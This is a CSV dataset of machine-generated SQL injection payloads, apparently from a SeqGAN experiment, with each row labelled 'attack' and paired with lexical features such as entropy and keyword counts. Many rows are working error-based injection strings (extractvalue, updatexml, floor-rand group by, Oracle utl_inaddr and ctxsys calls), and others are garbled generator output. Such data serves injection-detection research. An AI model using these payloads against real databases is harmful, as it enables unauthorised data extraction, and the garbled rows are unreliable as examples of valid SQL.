label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,1'itofwcepu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,349,11.0,11.0,3.4594316186372973,9.0,1.0,0.0,1.0,0.8181818181818182,0.09090909090909091,0.0,0.09090909090909091,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,350,348.0,33.0,3.5699017351244287,92.0,45.0,148.0,63.0,0.26436781609195403,0.12931034482758622,0.42528735632183906,0.1810344827586207,4.0,0.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,3.0,0.0,23.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'ad"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and "".vulT""  =  ""4386  )   WHERE Lolow  )  ,1   )     )  ||chr  (  113  )  )   )   ,  )  )   or row  (  select ,  )   as group by x  (  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,351,784.0,51.0,3.895064327237613,233.0,107.0,328.0,116.0,0.2971938775510204,0.1364795918367347,0.41836734693877553,0.14795918367346939,2.0,4.0,2.0,0.0,2.0,4.0,0.0,65.0,0.0,3.0,9.0,31.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.0,3.0,1.0,2.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,20.0
attack,"1%'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,352,291.0,37.0,3.827459915202577,99.0,35.0,117.0,40.0,0.3402061855670103,0.12027491408934708,0.4020618556701031,0.13745704467353953,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.0,2.0,2.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""ayrn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,353,198.0,30.0,3.909948919414596,73.0,37.0,68.0,20.0,0.3686868686868687,0.18686868686868688,0.3434343434343434,0.10101010101010101,0.0,2.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1%'  )   and   (  select counts  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,354,38.0,17.0,3.337312804650749,15.0,1.0,15.0,7.0,0.39473684210526316,0.02631578947368421,0.39473684210526316,0.18421052631578946,1.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,355,277.0,37.0,3.9278141410897223,99.0,35.0,105.0,38.0,0.3574007220216607,0.1263537906137184,0.37906137184115524,0.1371841155234657,0.0,4.0,0.0,0.0,2.0,2.0,0.0,20.0,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%2951qj'  =  'jqivbuqj'  =  'h""  =  ""j'  =  'yuyu"" like ""qj'  =  'wbb'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,356,77.0,21.0,3.486787786102269,25.0,5.0,26.0,21.0,0.3246753246753247,0.06493506493506493,0.33766233766233766,0.2727272727272727,10.0,4.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'c where uol,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,357,13.0,11.0,3.3927474104487847,9.0,1.0,2.0,1.0,0.6923076923076923,0.07692307692307693,0.15384615384615385,0.07692307692307693,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""vsvandp",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,358,207.0,29.0,3.4073796448580205,53.0,32.0,95.0,27.0,0.2560386473429952,0.15458937198067632,0.45893719806763283,0.13043478260869565,0.0,2.0,0.0,0.0,1.0,1.0,0.0,18.0,0.0,0.0,4.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-radrtd_s' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'h""  =  ""iptx2278.WHEREn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,359,312.0,45.0,4.227177915790126,119.0,46.0,107.0,40.0,0.3814102564102564,0.14743589743589744,0.34294871794871795,0.1282051282051282,2.0,2.0,1.0,0.0,2.0,3.0,0.0,19.0,0.0,3.0,5.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,-4095'  )   or group by concat  (  =  4386  )   then from information_schema.chactess  )  )   then 1 group by concat  (  select coumleltes  (  )  )   ) from mmhs group by x s by end  )   from arost_rolexts  )  #2 where couna'  =  'aledr.mets Pp mledu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,360,250.0,40.0,4.252781649994077,145.0,10.0,72.0,23.0,0.58,0.04,0.288,0.092,3.0,0.0,1.0,0.0,0.0,2.0,0.0,12.0,0.0,2.0,0.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,SSWNCTERAND 1 where b  =  and from  (  select cS when   (  4232  =  )   then 1 group by 3785 mx  )   from dual  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,361,117.0,41.0,4.274649059697515,57.0,10.0,41.0,9.0,0.48717948717948717,0.08547008547008547,0.3504273504273504,0.07692307692307693,0.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'eujbuhk'  =  'yw'  =  'e'  =  '' where 4244  =  4244 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,362,579.0,43.0,3.953009231009145,183.0,99.0,227.0,70.0,0.3160621761658031,0.17098445595854922,0.3920552677029361,0.12089810017271158,10.0,0.0,0.0,0.0,2.0,6.0,0.0,39.0,0.0,0.0,11.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,3.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack, AND 1 group by concat  (  =  ||u or -- or and e  )  SNCT  )   i,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,363,64.0,27.0,3.736698558647944,30.0,1.0,25.0,8.0,0.46875,0.015625,0.390625,0.125,0.0,0.0,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1' where row  (  #,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,364,18.0,10.0,2.974937501201927,8.0,1.0,6.0,3.0,0.4444444444444444,0.05555555555555555,0.3333333333333333,0.16666666666666666,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'lu' where 3716  =  3716 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,365,516.0,41.0,4.021895361600722,175.0,99.0,187.0,55.0,0.3391472868217054,0.19186046511627908,0.3624031007751938,0.1065891472868217,4.0,0.0,0.0,0.0,2.0,3.0,0.0,33.0,0.0,0.0,11.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,3.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ''  =  'allayzk",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,366,346.0,40.0,3.843318257527276,108.0,55.0,141.0,42.0,0.31213872832369943,0.15895953757225434,0.407514450867052,0.12138728323699421,4.0,0.0,0.0,0.0,2.0,2.0,0.0,26.0,1.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1"" zybbhjbun'  =  'couh' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,367,199.0,37.0,4.0728262789654,62.0,43.0,68.0,26.0,0.31155778894472363,0.21608040201005024,0.3417085427135678,0.1306532663316583,4.0,1.0,0.0,0.0,0.0,3.0,0.0,11.0,0.0,0.0,5.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,368,656.0,43.0,3.8167151666013353,186.0,103.0,273.0,94.0,0.28353658536585363,0.15701219512195122,0.41615853658536583,0.14329268292682926,2.0,2.0,0.0,0.0,2.0,3.0,0.0,54.0,1.0,0.0,7.0,26.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,3.0,0.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,10x7171706a71' where e group by S concat  (  chr  (  113  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,369,63.0,26.0,3.995802343551044,25.0,14.0,18.0,6.0,0.3968253968253968,0.2222222222222222,0.2857142857142857,0.09523809523809523,1.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""  )   where by FROM p  (  1045  =  3440  )   as group by concat  (  select   (  elt  (  select a when   (  select from  (  =  >  (  6825  =  ||chr  (  106  )  ||  )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,370,168.0,37.0,3.771752217852486,60.0,16.0,71.0,21.0,0.35714285714285715,0.09523809523809523,0.4226190476190476,0.125,0.0,1.0,0.0,0.0,0.0,3.0,0.0,12.0,0.0,0.0,0.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'+  (  select 'bjsj'  =  'jb'  =  'u'  =  'eu'  =  'j'  =  'w'  =  'u"" like ""ow'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,371,87.0,19.0,3.0644230642436647,24.0,1.0,35.0,27.0,0.27586206896551724,0.011494252873563218,0.40229885057471265,0.3103448275862069,16.0,2.0,0.0,0.0,0.0,7.0,0.0,1.0,0.0,0.0,0.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vWHEREEpyS.aws   )    )   or 1 group by select then FROM LIMIT  =  6   )    )     )   a group by x  )   or group by  8877  =  utl_in_hole  )   then 'i'x  (  =  )   unaddr  (  9173  =  4232  ) *lteddual where e group by FROM group by WHEREoueulllun'  =  'owlxalasys",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,372,586.0,54.0,4.235771748353463,238.0,69.0,219.0,60.0,0.4061433447098976,0.11774744027303755,0.37372013651877134,0.10238907849829351,4.0,2.0,0.0,0.0,3.0,6.0,0.0,35.0,0.0,2.0,6.0,10.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,3.0,1.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"-2951"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and "" and  (  select chr  (  113  )  )   di amnl_alteddr.gers clos where 1006  =  )   where 0 1  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,373,426.0,35.0,3.7545252689112303,134.0,57.0,168.0,67.0,0.3145539906103286,0.13380281690140844,0.39436619718309857,0.1572769953051643,0.0,2.0,3.0,0.0,0.0,3.0,0.0,33.0,0.0,4.0,0.0,26.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,2.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""uquou' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,374,343.0,34.0,3.7906181260929093,80.0,85.0,132.0,46.0,0.23323615160349853,0.2478134110787172,0.3848396501457726,0.13411078717201166,2.0,2.0,0.0,0.0,0.0,3.0,0.0,25.0,0.0,0.0,12.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sjloyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,375,472.0,41.0,4.036585765262254,146.0,101.0,170.0,55.0,0.3093220338983051,0.21398305084745764,0.3601694915254237,0.11652542372881355,4.0,0.0,0.0,0.0,2.0,3.0,0.0,31.0,0.0,0.0,12.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,3.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
